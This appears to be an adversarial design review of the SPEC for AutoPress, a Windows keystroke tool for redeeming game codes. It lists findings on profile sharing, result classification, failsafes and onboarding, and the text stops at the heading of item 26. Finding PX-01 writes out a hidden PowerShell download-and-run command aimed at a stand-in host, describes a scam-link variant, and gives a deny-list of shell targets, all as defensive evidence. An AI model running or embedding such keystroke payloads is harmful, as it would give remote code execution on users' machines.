# AutoPress SPEC v1: adversarial critique, PRODUCT / UX lens

Reviewer: fresh-context critic, 2026-11-17. The task was to find problems, not to confirm the SPEC.
Lens: whether a non-technical person can use the product safely and get correct results.

Inputs read: `SPEC.md` (all 1067 lines); every foundation module and stub under `autopress/`; `tests/` (conftest,
fakes, interface tests); `tools/fake_redeem_app.py`; `docs/requirements.md`; `docs/design-preview/README.md`;
`docs/research/{ux,win32_input,win32_windows,ocr}.md`; and the mock-up `docs/research/ux/minibar_dark.png`.

What was run (project venv; scratch scripts live in a session scratch folder outside the repo;
the outputs that matter are quoted inline below):
* `pytest -q`: 250 passed. `tools/check_ownership.py`: 99 rows, 86 files, 0 problems. The foundation is internally
  consistent, so every finding below is a design gap, not a failing test.
* `t_import.py`: runs `ProfileStore.import_file` on an invalid file and on a valid file, with AUTOPRESS_HOME in scratch.
* `t_classify.py`: applies the SPEC 5.5 classification rule (squash, class order, `textutil.fuzzy_contains`) with
  `KeywordConfig()` defaults to realistic messages.
* `t_profile.py`: validates a hostile shared profile, prints model defaults and works coordinate examples.
* `t_flags.py`: measures how many random codes the SPEC 5.4 look-alike rule flags.

Counts: **3 blocker, 22 major, 9 minor** (34 items).

Top 3:
1. PX-01 (blocker): a shared profile is effectively a keystroke program. `Win+R`, then `type_text "powershell …"`,
   then `Enter`, aimed at explorer.exe, validates with only one info note.
2. PX-02 (blocker): queued codes have no game or profile attached. A run types every pending code, including other
   games' codes, into the active target, and the INVALID results it produces cannot be reset or imported again.
3. PX-03 (blocker): on a single monitor the topmost MiniBar sits inside the target's window. OCR reads its chip
   「已使用 1」 as a USED result, and the bar blocks clicks underneath it.

The most important major is PX-04: result classification can silently record the wrong result, and with
history-skip that loses codes for good.

---

## Findings

1. **PX-01 · blocker · Shared profiles are executable content: a profile can send any keystrokes to shells, browsers or chat apps**
   - Where: SPEC 1.1 R4 (JSON sharing), 5.2, 6.4.2 (import shows a summary, then saves), 2.7.1;
     `autopress/models.py:554` (Win is rejected for hotkeys only), `models.py:1058-1062` (a key step only has to
     parse), `models.py:1264` (`describe_actions`), `autopress/storage.py:188-198` (import keeps the author's
     target, including `allow_same_process`).
   - Problem: profiles are meant to be posted on Discord or Bahamut (persona 小美, ux.md 5.1). The importer keeps
     the author's target (exe, title, class, allow_same_process). Key and type_text steps accept anything: Win
     combos, Ctrl+L, Alt+F4, fixed text without `{code}`. The foreground guard gives no protection here, because
     the window being attacked IS the profile's target. ux.md 5.7 promises "no executable content". That is
     false for keystroke sequences.
   - Evidence (`t_profile.py`): target `explorer.exe`, title mode any, allow_same_process true, with steps
     `key Win+R`, `type_text "powershell -w hidden -c iwr x.example/a.ps1|iex"`, `key Enter`, `type_code`.
     `Profile.validate()` returns only `[info] 沒有「辨識結果」步驟…`. `describe_actions()` shows the steps as one
     line among normal steps: 「此設定檔會：按 Win+R、輸入文字「powershell -w hidden -c iwr x.example/a.ps1|iex」、按 Enter、輸入序號」.
     `validate_hotkey("Win+R")` is refused, but key steps have no matching rule. The same pattern against
     chrome.exe (`Ctrl+L`, URL, `Enter`) or Discord.exe (type a scam link, `Enter`) acts from the victim's own
     logged-in account.
   - Fix (A1, before the groups start): (1) Never import the target. An imported profile arrives with an empty
     target and the user must pick the window; allow_same_process is cleared. This also fixes PX-17.
     (2) Reject Win in key steps. Deny-list shell and system targets (explorer, cmd, powershell, pwsh,
     WindowsTerminal, OpenConsole, conhost, regedit, mmc, taskmgr, mshta, wscript, cscript, rundll32) with a
     preflight error `target_forbidden`. (3) The import summary is a warning card that lists every literal text and
     key combo verbatim. It highlights risky combos (Ctrl+L, Alt+F4, Ctrl+W, Alt+Tab, Ctrl+Shift+Esc) and any
     type_text without `{code}`, and asks for an explicit 「我看得懂這些動作」 confirmation. (4) Help and README:
     import profiles only from people you trust.

2. **PX-02 · blocker · Queued codes are not tied to a game or profile, so a run submits every pending code to the active target**
   - Where: SPEC 2.4 step 1, 5.7 (`build_plan` over `queue.runnable`), 6.4.1 (867: import-time history check
     uses whichever profile is active); `models.py:1423-1440` (CodeItem has no game or profile field);
     `autopress/codes/queue.py` `runnable()`; `runner/engine.py` `build_plan` docstring.
   - Problem: the primary persona (ux.md:87, "3-10 codes per livestream in 2-3 games") pastes codes for several
     games into the same queue. Pressing 開始兌換 with the Genshin profile also types the Star Rail codes into the
     Genshin page. Consequences:
     - attempts and rate-limit budget are wasted;
     - INVALID results are written to the history under the wrong `game_key`;
     - the failure stop never fires, because INVALID resets the counter (PX-06);
     - the wrongly INVALID items are stuck. INVALID counts as done, `retry_failed` only resets FAILED/REVIEW,
       there is no 「重設為待兌換」 (row menu and bulk bar, SPEC 863-864), and re-import is refused as a duplicate
       because de-duplication covers the whole queue.

     The same code can never be queued for two games.
   - Evidence: the CodeItem fields; `CodeItem.checked` defaults to True, so 「只跑勾選的」 still includes
     everything until the user unticks rows by hand; SPEC 5.7 defines no reset transition for INVALID, EXPIRED or
     USED.
   - Fix (A1, because models.py is frozen for the groups): add `CodeItem.game_key` (and `profile_id`), set at
     import from the active profile. `queue.runnable` and `build_plan` filter by `plan.profile.game_key()`, and
     de-duplication is per game. The Codes page shows the active game's codes, with an 「所有遊戲」 filter. Add a
     row and bulk action 「重設為待兌換」. Codes imported with no active profile get `game_key ""`, and the Run
     page asks which game they belong to.

3. **PX-03 · blocker · On single-monitor setups the MiniBar sits on top of the target: OCR reads its chips as results and the bar blocks clicks**
   - Where: SPEC 2.4 step 5; 6.4.3 (MiniBar, "placed away from the target"); `autopress/ui/minibar.py:4-8`
     (default: "corner farthest from the target's client rect (or on another monitor)"); `minibar.py:40`
     (`place_away_from(rect)` receives only the target rect); SPEC 5.3 (`ocr_check` region None means the whole
     client area); SPEC 2.7.1 (root-window check before each click); `docs/design-preview/README.md:62`, which
     promised that the bar avoids click points and OCR regions.
   - Problem: on a laptop with one screen and a maximised browser or a borderless game, which is the common
     case, every corner of the screen is inside the target's client area. mss captures screen pixels, so whole-
     window reads (the default) and any region under the bar include the bar.
     - The mock-up `minibar_dark.png` shows 「成功 5」, 「已使用 1」 and 「正在兌換 MX4T9PK2JR7D」. After the first USED
       result, 「已使用 1」 contains the USED keyword 「已使用」 (`models.DEFAULT_KEYWORDS`). Every later whole-window
       check is then classified USED, and those codes are history-skipped for good (PX-04, PX-05).
     - A click point under the bar trips PointNotOnTarget, and the user reads 「點擊位置被其他視窗遮住」, although
       the covering window is AutoPress itself.
     - Evidence crops show the bar.

     The groups collide at integration: G7 places the bar, while G4 and G2 capture and click through it.
   - Fix: (1) While a code's steps run, the runner hides the MiniBar (or makes it fully transparent and
     input-transparent) and shows it again between codes. Alternatively, exclude it from capture with
     `SetWindowDisplayAffinity(WDA_EXCLUDEFROMCAPTURE)` (Windows 10 2004+; UNVERIFIED with mss/BitBlt, must be
     measured) and still keep it off click points. (2) `place_away_from()` takes every PreviewMark rect, points
     and regions alike. (3) The capture path blanks AutoPress's own window rects before OCR. (4) The bar shows
     icons and numbers, not status words. (5) The PointNotOnTarget message names the covering window.

4. **PX-04 · major · Result classification can silently record the wrong result: the first matching poll wins, static page text and the previous code's message both count, and success messages that mention expiry become EXPIRED**
   - Where: SPEC 5.3 `ocr_check` (749: "poll … until not UNKNOWN or timeout"); 5.5 (773); `models.py:1101-1104`
     (bare 「過期」 keyword; "expired" is matched fuzzily); `models.py:1123-1126` (EXPIRED is tested before
     SUCCESS); `tools/fake_redeem_app.py:5-13` (answers instantly, with no latency and no persisting message).
   - Problem:
     - (a) With no region (allowed, only a WARNING) the whole page is read. Redeem pages contain instruction
       text with keywords, and the first poll at 800 ms matches it for every code.
     - (b) Some pages keep the previous result on screen until the server answers. If the answer takes longer
       than `initial_delay_ms`, the first poll reads the previous code's message, and every result shifts by one
       code.
     - (c) Real success messages often mention when the reward mail expires.
   - Evidence (`t_classify.py`, SPEC rule plus default keywords):
     - 「兌換成功！獎勵已發送至信箱，請於7天內領取，逾期將過期」 → `expired` (keyword 過期).
     - "Redeemed successfully! Rewards were sent to your in-game mail. Mail expires in 30 days." → `expired`
       (fuzzy "expired"≈"expires").
     - Static page text 「兌換碼兌換 請輸入兌換碼 兌換碼過期後將無法兌換」 → `expired`.
     - "Enter redemption code. … Invalid or expired codes cannot be redeemed." → `expired`.

     Codes misclassified as SUCCESS or USED are history-skipped forever (SPEC 806-808).
   - Fix:
     - Take an OCR baseline of the region right before the submitting step, and classify only lines that are
       new or changed.
     - Require a region in templates (an ERROR for templates, a WARNING elsewhere).
     - Drop bare 「過期」/「过期」 and stop fuzzy-matching "expired".
     - If SUCCESS and another class both match, return UNKNOWN so the user is asked.
     - Add `--latency-ms` and a persistent result label to `fake_redeem_app`, so the G4 end-to-end test catches
       stale reads.

5. **PX-05 · major · Codes submitted without any result check are treated as redeemed forever**
   - Where: `models.py:1397-1398` (default `history_skip_statuses = [success, used, submitted]`); SPEC 5.6 (782);
     7.2 `no_result_check` is only info (952); 5.7 `build_plan` skip (806).
   - Problem: a profile without `ocr_check` marks every attempt SUBMITTED, even when the page was rate-limited,
     logged out, showing a captcha, or the click missed. Because SUBMITTED is skipped by default, those codes are
     silently dropped from every later import and plan. A rate limit can never be detected either.
   - Evidence: `Settings()` prints `['success', 'used', 'submitted']` (`t_profile.py`). `Profile.validate` only
     adds an INFO note: 「沒有「辨識結果」步驟，結果會標為「已送出」」.
   - Fix: remove SUBMITTED from the default skip list, or ask per import. Make `no_result_check` a WARNING that
     states the consequence (「無法判斷是否成功，也無法偵測操作過於頻繁」). Show SUBMITTED as 「已送出（未確認）」.

6. **PX-06 · major · A systematic typing problem turns the whole batch INVALID: nothing stops the run and nothing undoes it**
   - Where: SPEC 2.5 (138: only FAILED and unknown count; "any other final status resets the counter");
     `models.py:119-122` (`is_done` includes INVALID); `codes/queue.py:106-107` (`retry_failed`).
   - Problem: sometimes every typed code is wrong for the same reason: the IME rewrote it, the case was changed
     (PX-19), the split is wrong, the game drops keys, or the input went to the wrong field. The game then
     answers "invalid" every time. INVALID resets the failure counter, so a 50-code batch runs to the end and
     every code becomes INVALID. Those codes count as done, 重試失敗 skips them, and re-import is refused as a
     duplicate. To the user it looks like 50 dead codes.
   - Fix: add a separate guard that pauses after N consecutive INVALID results (default 3) with the message
     「連續 3 筆被判定無效，可能是輸入方式有誤（輸入法、大小寫、拆段）；請用「測試一筆」檢查輸入框內容」. Add
     「重設為待兌換」 (PX-02). Suggest `verify_region` when a run starts without one.

7. **PX-07 · major · Any step error after the code was submitted marks it FAILED: 重試失敗 submits it again and history-skip ignores it**
   - Where: SPEC 2.5 (134: "except StepError: item FAILED"), compared with 131-132 (a guard trip after submit
     gives REVIEW); 5.7 (FAILED is "via 重試失敗"); `models.py:1397-1398`.
   - Problem: in the in-game flow "click 確認 → ocr_check → click_text 確定", a missing 確定 button (PX-08), or a
     wait_text timeout after the result was already read, turns a SUCCESS into FAILED. The code then counts
     towards `stop_after_failures`, is submitted again by 重試失敗, and is not skipped at the next import. This
     contradicts the REVIEW rule that already applies to guard trips after submit.
   - Fix: if a result class was already set, keep it and log the step error as a warning. Otherwise, if
     `possibly_submitted`, use REVIEW 「送出後的步驟失敗，請確認是否已兌換」. Only errors before submit give FAILED.

8. **PX-08 · major · The step model cannot express "dismiss the popup if there is one", and the only unconditional dismissal (Esc) opens game menus**
   - Where: SPEC 1.2 (conditional steps deferred); 5.3 `click_text` ("not found → click fallback_point, else
     StepError"); `models.py:832-849` (no `on_not_found`), 844; ux.md:107 and :154-155 (close with 確定/OK or Esc);
     `docs/design-preview/README.md:45` (wizard step 「選怎麼關閉結果」); `tools/fake_redeem_app.py:12-13` (the
     same popup type for every result).
   - Problem: the result display often depends on the outcome. Success shows a dialog with 「確定」 or 「領取」,
     invalid shows red text inline, and some dialogs close themselves after a success.
     - With `click_text 確定`, the code fails whenever the dialog is absent (PX-07).
     - With `key Esc`, many games open their pause or main menu when no popup is open, and the next code then
       clicks into that menu.
     - The fake app shows the same popup for every result, so the tests cannot catch this.
     - The SPEC's wizard has no "how do you close the result" choice, which README:45 promised.
   - Fix: add an A1 field `ClickTextParams.on_not_found: fail | continue` (reusing `TimeoutAction`), so that a
     dismissal can be "click 確定 if present". Templates use it. The wizard asks 「結果視窗怎麼關？（按確定／按
     Esc／不用關）」. Add `fake_redeem_app --popup-on success|always|never`.

9. **PX-09 · major · The guard checks the window, not the field: a typed code and Enter can land in game chat or trigger game hotkeys**
   - Where: SPEC 2.7.1 (checks foreground and the root window only); `models.py:864` (`verify_region` defaults to
     None); ux.md:155 (the in-game template has no precondition); SPEC 5.3 `type_text` ("e.g. /redeem {code}").
   - Problem: some games close the redeem dialog after a code, and a click on the input can miss (size change,
     PX-16). Keystrokes then go to whatever has focus inside the correct window. In VK mode, letters act as game
     hotkeys and Enter opens chat, so the next code plus Enter is posted to public chat. That leaks a single-use
     code. The default `on_unknown = pause` stops after the first wrong code, but `continue` is one click away.
   - Fix: templates begin with a precondition `wait_text` (the dialog title or the 「兌換碼」 label is visible,
     `on_timeout = fail`, region set) before any typing. The in-game template sets `verify_region` by default.
     Choosing `on_unknown = continue` shows a warning in the profile. Help warns that chat-command redemption
     (`/redeem`) is public if the command is wrong.

10. **PX-10 · major · A stop or failsafe that fires during a key or mouse hold leaves the key or button pressed**
    - Where: SPEC 2.3 (every wait, including key delays inside `win32.input`, goes through the interruptible
      `RunControl.sleep`); 2.7.2 (only modifiers are released in `finally`); `autopress/win32/input.py:7-9`; `:117`
      (click: press, hold `hold_ms`, release); `:122-123` (`release_all_modifiers` releases Shift and Ctrl, and Alt
      or Win only if we pressed them); hold clamps go up to 5000 ms for clicks (`ClickPointParams.hold_ms`).
    - Problem: `click()` holds the button 30 ms by default, and VK typing holds keys (≥ 20 ms for polling
      games). If the sleep raises StopRequested, FailsafeTriggered or UserActivity during the hold, the up event
      is never sent. The SPEC does not require a `finally` for letter keys or mouse buttons, and
      `release_all_modifiers` releases neither. After a failsafe trip, the left button stays down while the user
      moves the mouse, which drags across the desktop at exactly the moment the user wanted everything to stop.
    - Fix: in SPEC 2.7.2, every key and mouse button we press is released in `finally` before the exception
      propagates. `release_all` also releases mouse buttons and any key we pressed. G3 test: raise inside the
      hold, then assert `GetAsyncKeyState` reports the key up.

11. **PX-11 · major · The pause control flips under the user's hand**
    - Where: SPEC 2.6 (157: pressing F8 or clicking the MiniBar is itself physical input, "intended");
      `RunSession.toggle_pause` ("pause when running, resume when paused"); the MiniBar's 暫停 [F8] button; Run
      page 「暫停／繼續 [F8]」.
    - Problem:
      - With `pause_on_user_input` on (the default), moving the mouse towards the MiniBar already hard-pauses the
        run. The bar switches to its paused state, so the click aimed at 「暫停」 lands on 「繼續」 and resumes the
        run while the user's hand is on the mouse.
      - F8 races: the key press counts as physical input, so the runner pauses within 50 ms, while WM_HOTKEY
        calls `toggle_pause()`. If the PAUSED state reaches the GUI first, the toggle resumes the run.
      - Resuming has no countdown.
    - Fix: make `pause()` idempotent. F8 only pauses; resuming uses an explicit control followed by a 2-3 s
      countdown. Ignore a toggle that comes within about 1 s of an automatic pause. Disable the MiniBar's resume
      button for about 0.7 s after any state change.

12. **PX-12 · major · The failsafe corner is the primary monitor's (0, 0), which on many multi-monitor layouts is not a screen corner, and nothing shows it during a run**
    - Where: SPEC 2.6 (153); 6.3 status-bar text 「左上角緊急停止」; 7.1 failsafe message (932);
      `win32/input.py` `failsafe_triggered`; `docs/research/win32_input.md:4`. The research PC itself has its
      second monitor to the left of the primary, with the virtual desktop origin at -1920,0.
    - Problem: when a monitor sits left of or above the primary, (0, 0) is in the middle of an edge. "Slamming
      the mouse into the top-left corner" lands at (-1920, 0) and does nothing; triggering needs precise aim at
      (0, 0) ± 3 px. Games that confine the cursor (ClipCursor) make the corner unreachable. During a run the main
      window and its status bar are hidden, so the only reminder disappears. Users believe they have an
      emergency stop that does not work.
    - Fix: trigger in the top-left corner of EVERY monitor, or in any corner of the virtual desktop. Show
      「F9 停止 · 滑鼠移到這個角落＝緊急停止」 with an arrow on the countdown overlay and as the MiniBar tooltip. Help
      explains that games which lock the cursor need F9.

13. **PX-13 · major · Browser targets: an empty title matches any window of the browser, and a tab change is never detected**
    - Where: `models.py:791-792` (an empty title or ANY matches); SPEC 7.2 `target_multiple` is info only
      ("topmost used"); 2.5 (124: alive means pid, exe and class only); 2.7.1.
    - Problem: a target `chrome.exe` with an empty title (cleared by the user, or from a shared profile) picks the
      topmost Chrome window. That may be Gmail or a web chat, and the guard happily lets the code plus Enter
      through. During a run the title is never checked again, so if the redeem page opens a new tab in the same
      window, input continues in the wrong page.
    - Fix: for browser exes (chrome, msedge, firefox, brave, opera), require a title keyword and give a preflight
      error when it is empty. Make `target_multiple` a warning that needs a click and shows the title that will
      be used. Check `TargetMatch.matches(title)` again before every code and pause with 「目標頁面標題已改變」.

14. **PX-14 · major · What happens to AutoPress's windows during a run is undefined**
    - Where: SPEC 2.4 step 5 (main window hidden) and step 3 (hotkey failure → toast, run allowed); 6.4.3
      (attention panel and paused banner live on the Run page; the MiniBar has expand); `models.py:1392`
      (`minibar_enabled`); `models.py:1629` (PlanItem keeps a copy of the code); `codes/queue.py` `update` ("KeyError
      if absent").
    - Problem:
      - (a) An unknown result raises an attention panel on the Run page while the main window is hidden.
        Nothing says the main window comes back.
      - (b) Pressing expand while the run is going pauses it through UserActivity or FOCUS_LOST. The message then
        tells the user to 「切回目標視窗」, although they only expanded the window.
      - (c) Resuming from the main window must hide it again and re-focus the target. Not defined.
      - (d) With `minibar_enabled = False` and a hotkey that failed to register (1409), there is no visible
        control at all, and the warning toast is shown on the hidden window.
      - (e) While paused and expanded, the user can edit or remove queued codes. The plan holds copies, so the
        runner types the old code; a removed item makes the bookkeeping update a missing id.
    - Fix:
      - On attention, the MiniBar shows a compact card (OCR text, the result buttons and 展開).
      - Expand pauses first.
      - Resume from the main window hides it and runs a countdown.
      - If the hotkeys failed or `minibar_enabled` is False, keep the main window minimised in the taskbar and
        show the MiniBar anyway.
      - During a run, lock the rows that are in the plan, or read the current code when each code starts and
        skip removed ids.

15. **PX-15 · major · The per-code algorithm has no outcome for unexpected errors, a target that closes mid-code, or a window resized mid-run**
    - Where: SPEC 2.5 (only guard trips, failsafe, StopRequested and StepError are handled); `win32/windows.py`
      `client_rect` ("OSError if gone"); `models.StopReason.ERROR` and `TARGET_LOST` and `PauseReason.ERROR` are
      never produced by the SPEC; 2.2 (code_started → RUNNING).
    - Problem: if the target closes between steps, `client_rect` or the capture raises OSError. OcrTimeout,
      CaptureError and UnmappableChar are not mapped either; only ClipboardBusy has a 7.1 text. The runner's
      `finally` emits `finished`, but the current item stays RUNNING (兌換中) until the next app start. A window
      resized mid-run silently switches auto coordinates from offset to ratio.
    - Fix: catch anything else. The item becomes REVIEW if `possibly_submitted`, otherwise PENDING, and the run
      pauses with ERROR (an attention panel with the localized text and 「開啟紀錄檔」). A vanished window pauses
      with TARGET_LOST. On `finished`, any RUNNING item becomes REVIEW or PENDING. If the client size differs from
      the size at run start, pause with 「視窗大小改變了，請先預覽點位」.

16. **PX-16 · major · Shared profiles do not survive another PC's scaling or window size**
    - Where: SPEC 5.2 (725-727); 1.2 (61: 校正 wizard deferred, "MVP: ratio coordinates + preview + re-pick");
      7.2 has `size_changed` only; `models.py:610` (`ref_dpi` is "diagnostics"); `:645-668` (auto uses the offset
      only when the size is identical); `:838-839` (click_text offsets in physical px); Anchor is stored per point
      but no UI can set it; `docs/research/win32_windows.md:227-229` (locate reflowing web pages by OCR;
      re-validate when ref_dpi or the size differs).
    - Problem, with evidence (`t_profile.py`):
      - A web point recorded at client 1920×969 at 96 dpi resolves to (960, 297) on a 125 % laptop whose
        maximised Chrome client is 1920×959. The page content, scaled 1.25×, is near y = 375: a 78 px miss.
      - The same client size at a different DPI resolves by offset, ignoring DPI entirely.
      - A centred fixed-size dialog recorded at 1280×720 resolves to (960, 690) at 1920×1080 instead of (960, 640).
      - Click_text offsets ("200 px right of the 兌換碼 label") are not scaled.
      - The importing user gets only a size warning and a preview, then has to find and re-pick each point by
        hand. The guided setup is offered only after creating a profile from a template.
    - Fix: add a preflight warning `dpi_changed`, and scale offsets by `window_dpi / ref_dpi`. The template, not
      the user, chooses the anchor per point (web: top-left offset, DPI-scaled; centred dialog: centre; scaled
      game UI: ratio), and the step editor shows it as 「對齊：左上／置中／依比例」. Express click_text offsets as
      multiples of the found text's height. Reuse the setup wizard as 「重新對準」 after an import and as the action
      button of `size_changed` and `dpi_changed`.

17. **PX-17 · major · Profile import and export: the API contradicts the SPEC, invalid files are renamed inside the user's own folder, and exports leak and pin the author's window title**
    - Where: SPEC 6.4.2 (879-880: save only after 匯入 is confirmed, via `ProfileStore.import_file`);
      `storage.py:188-198` (`import_file` saves immediately); `storage.py:82-98` (`read_json` renames invalid JSON);
      `storage.py:201-203` (export writes the profile as is); `ui/window_picker.py:5` and `models.py:1584-1587`
      (`to_target()` uses the full current title, mode contains).
    - Evidence (`t_import.py`): importing a non-JSON file named `shared_profile.autopress.json` raised the right
      StorageError (「這不是 AutoPress 設定檔」). But the user's file in "Downloads" was renamed to
      `shared_profile.autopress.json.broken-20261117-161832`. A valid file was saved before any confirmation
      (profiles went from 0 to 1).
    - Problem: G7 cannot build "summary before save" on the A1 API. It must re-implement parsing, and calling
      `read_json` renames files that do not belong to AutoPress. Exported targets carry the author's full window
      title, which can include a browser profile name, an account or a character name, plus `author`. On another
      PC the localized page title rarely matches, so most imports start with `target_not_found`.
    - Fix (A1): add `storage.parse_profile_file(path) -> Profile`, which never renames or writes. `read_json`
      renames only files inside `data_dir()`. Import becomes parse → summary → save. Export keeps exe and class,
      reduces the title to a short keyword the author confirms (or leaves it empty), and never exports
      `allow_same_process`. Import always asks the user to pick the target (PX-01).

18. **PX-18 · major · OCR-imported codes are almost always 需確認, and the SPEC gives no way to confirm them**
    - Where: SPEC 5.4 (762-765: look-alikes and low-confidence characters are flagged; flagged items "are not run
      until confirmed or edited"); 5.7 (803: only an edit clears flags); 6.4.1 (863-864: neither the row menu nor
      the bulk bar has a confirm action); `codes/normalize.py` `LOOKALIKE_GROUPS`; ocr.md:241 (the research says
      highlight and mark, not block); design-preview README:18 (the mock-up shows 2 of 24 codes needing review).
    - Evidence (`t_flags.py`): with the SPEC look-alike rule, the share of random codes flagged is 99.8 % for
      10-character and 100 % for 16-character codes in the generic preset, 96.8 % / 99.6 % for hoyoverse and
      99.0 % / 99.9 % for nintendo.
    - Problem: after a screenshot import every code is REVIEW, and 開始兌換 stays disabled ("without runnable
      codes"). The only way forward is to open each cell editor and commit it unchanged, if that even counts as an
      edit. The crop of the source line shown in the OCR review dialog is not kept, so after an INVALID result the
      user cannot compare the code with the image.
    - Fix: confirm inside OcrReviewDialog, where the crop is visible (a 「已核對」 tick per candidate, or
      「全部已核對」). Keep REVIEW only for characters below the confidence threshold or characters that were
      repaired; look-alikes are highlighted, not blocked. Add a row and bulk action 「確認無誤」 (REVIEW →
      PENDING). Store a small crop for each OCR item in the data folder.

19. **PX-19 · major · Normalisation silently changes pasted or file codes: case is upper-cased, and underscores and tildes are rewritten and then dropped**
    - Where: `models.py:718` (`CodeFormat` default `case_sensitive = False`, "upper-cased at import");
      `codes/presets.py:6` (generic: upper); `codes/normalize.py:16` (DASHES includes "_" and "~"); `:32` (drop
      separators; upper-case unless case-sensitive); SPEC 5.4 (761); ux.md:55 (HoYoverse is case-sensitive,
      Wuthering Waves uses "exact capitalisation", Blue Archive "as written"); SPEC 5.3 `type_code` verify
      compares squashed (casefolded) text.
    - Problem:
      - A profile with the generic format (likely for both generic templates) upper-cases mixed-case codes
        whenever `detect_format` does not choose a case-sensitive preset, for example in a mixed batch. For a
        case-sensitive game the typed code is wrong, and the game says "invalid" (PX-06 does not stop this).
      - For text sources too, "_" and "~" become "-" and are then removed in formats without groups
        ("MAPLE_2026_GIFT" → "MAPLE2026GIFT").
      - Text sources carry no flags, so the user is never told.
      - The verify step casefolds, so it cannot catch a case error.
    - Fix: the generic preset preserves case (charset A-Za-z0-9; compare case-insensitively only for the
      de-duplication and history keys). Map "_" and "~" only for OCR sources. Keep separators from text sources
      and let `type_code.strip_separators` decide. Flag, and show raw next to normalised, whenever normalisation
      changed a character. Verify case-sensitively when the format is case-sensitive.

20. **PX-20 · major · Exclusive-fullscreen (black capture) is checked only in preflight, where it cannot work; during the run it shows up as generic failures**
    - Where: SPEC 7.1 (935: blank capture is a preflight warning); 7.2 `capture_blank`; 2.4 (preflight runs while
      AutoPress is in front); `win32_windows.md:105` (minimised windows report -32000 rects) and `:193-195`
      (exclusive fullscreen cannot be captured).
    - Problem: at preflight time AutoPress's main window is in front. A fullscreen game is minimised and reports
      a garbage rect; a windowed game may be covered by AutoPress itself. In the run, a black capture makes
      click_text fail with 「找不到文字」 and then stops with 「連續 3 筆失敗」, or `ocr_check` reads 「未讀到任何文字」
      and gives REVIEW. The actionable "use borderless mode" text never appears. Restoring an exclusive-fullscreen
      game also takes seconds (a display mode switch), while the after-focus settle time is 200 ms.
    - Fix: run `looks_blank` on every capture the runner takes, and on a blank frame pause with the 7.1
      blank-capture text instead of raising a StepError. After restoring a minimised target, wait until two client
      rect reads in a row agree (up to about 5 s) before the first input.

21. **PX-21 · major · First run starts outside the app: SmartScreen, antivirus and running from inside the zip are not addressed, and the distribution channel is undefined**
    - Where: SPEC 10.1 (1020-1031: onedir zip); 3.2 (G8 README and user guide); 6.4.6 (Help); requirements.md
      item 7 (private repo) against the user's goal 「給所有人用」. A grep of SPEC.md and the research docs for
      SmartScreen, Defender, antivirus, unzip and 解壓 finds nothing.
    - Problem: an unsigned, newly downloaded PyInstaller exe triggers "Windows protected your PC" (More info →
      Run anyway). An app that combines SendInput, global hotkeys and screen capture risks antivirus false
      positives. Launching AutoPress.exe from inside the zip in Explorer offers "Run" without extracting the rest;
      the onedir build then cannot find `_internal` and fails before any AutoPress code runs. Non-technical users
      stop at these points. Also, a private GitHub repo cannot serve downloads to "everyone".
    - Fix: README and user guide open with 「下載後先解壓縮」, SmartScreen screenshots, and what to do on an
      antivirus warning. Name the zip's top folder 「AutoPress（請先解壓縮再執行）」. Add a Help section
      「防毒軟體誤判」. Ask the user how other people will get the zip before G8 writes download instructions.

22. **PX-22 · major · In-app first-run gaps: no state defined without a profile, disabled buttons that never explain why, a wizard that ends in a step that may be impossible, and no "tested" check**
    - Where: SPEC 6.4.1 (857: buttons disabled without runnable codes or a profile; 867: imports use
      `profile.game_key()`); 6.4.2 (876-878: the wizard ends with 預覽點位 and 測試一筆); the 7.2 keys; ux.md:114
      (preflight includes "profile tested"); design-preview README:79.
    - Problem:
      - Users usually paste codes before creating a profile. With no profile, the Codes page's format combo,
        `game_key` (the profile is None) and history skip have no defined behaviour.
      - The disabled 開始兌換 and 試跑 1 筆 buttons give no reason.
      - The wizard's final 「測試一筆」 needs a code in the queue, which a first-time user may not have.
      - Nothing records whether a profile was ever tested, so preflight cannot warn about an untested profile,
        although ux.md and the README promise that check.
    - Fix:
      - Without a profile, the Codes page uses the generic format and shows the banner
        「先建立或選擇設定檔，才能開始兌換」.
      - Disabled buttons give their reason as a tooltip and an inline hint.
      - The wizard's test step offers a paste box for one real code.
      - Add `Profile.last_test_ok_at` (A1), set by a successful 測試一筆, and a preflight warning
        `untested_profile`.

23. **PX-23 · major · `Step.label` holds one language, but the setup wizard's per-step instructions come from it**
    - Where: `models.py:945` (`label: str`); SPEC 6.4.2 (877: instruction = the step's `display_title`, e.g.
      「點一下序號輸入框」); `TemplateInfo` is bilingual only for title and description; SPEC 8.2 G8 ("bilingual
      TemplateInfo").
    - Problem: the templates (G8) must put instructions such as 「點一下序號輸入框」 into `Step.label`, so English
      users see Chinese wizard prompts. Without a label they see the bare type label "Click position", which does
      not say what to click. The groups cannot add a field to models.py.
    - Fix (A1): add `label_en` (or a `hint_zh`/`hint_en` pair) to Step, with a `display_title` that picks by
      language, or add `TemplateInfo.step_hints` keyed by step id. The G8 templates fill both languages.

24. **PX-24 · major · User requirement 8 (a user guide of annotated screenshots of the real app, on GitHub) is missing from the SPEC**
    - Where: `docs/requirements.md` item 8; SPEC 1.1 (the table has R1-R6 only, and its R6 is requirement 7);
      3.2 G8 rows (only "user guide (zh-TW), doc screenshots").
    - Problem: requirements.md wins over the SPEC, yet nothing tells G8 four things: every screen must be
      captured from the real program, not from `docs/design-preview` or the prototype PNGs; regions must be marked
      with numbered callouts and explained one by one; the guide must render on GitHub (relative image paths, no
      markup GitHub strips); and which screens and states to cover. The screenshot review in 10.3 is a QA step,
      not the guide.
    - Fix: add R7 (private repo) and R8 rows to 1.1 with acceptance criteria: the list of screens and states,
      numbered callouts drawn by `tools/screenshots.py`, one caption per callout, images under `docs/images/`,
      demo data only, a link from the README. Integration checks R8.

25. **PX-25 · major · Promises from the design preview the user was shown are silently dropped**
    - Where: SPEC 1.1 (54-55: the README "describes the same product; where it says 「規劃中」 this SPEC decides");
      `docs/design-preview/README.md`:
      - :62 the mini bar avoids click points and OCR regions;
      - :45 the wizard asks how to close the result;
      - :76 the 條件停止 step type;
      - :78 the 「校正」 wizard;
      - :79 preflight shows 設定檔測過了沒 and an estimated time;
      - :80 a 略過清單 (skip list);
      - :81 an OCR engine and language setting.
    - Problem: these lines are not marked 規劃中, yet the SPEC removes or defers each one. 1.2 defers 校正 and
      if_stop; there is no untested-profile key and no OCR language setting; the MiniBar avoids only the target
      rect. The user will judge acceptance against what they were shown.
    - Fix: for each line, either build a minimal version (MiniBar avoidance PX-03, the close choice PX-08, the
      untested check PX-22, the time estimate in preflight) or mark it 「延後」 in the README and tell the user
      before implementation starts.

26. **PX-26 · minor · 重試失敗 also re-submits codes that may already be redeemed**
